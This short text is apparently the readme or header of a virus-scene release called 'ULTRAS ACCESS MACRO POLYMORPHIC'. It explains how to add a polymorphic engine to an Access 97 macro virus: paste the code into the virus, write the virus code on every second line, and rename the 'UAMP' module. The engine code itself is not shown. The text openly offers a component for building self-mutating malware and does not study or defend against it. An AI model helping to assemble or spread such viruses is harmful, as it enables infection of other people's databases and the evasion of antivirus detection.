ULTRAS ACCESS MACRO POLYMORPHIC
(c) by ULTRAS

This first polymorphic works on access97. Place this code in your macro virus
and make sure your code is written on each second line. Then Install one or
several on this functional and your virus works polymorphic. Replace "UAMP"
with the name of your macro virus module.
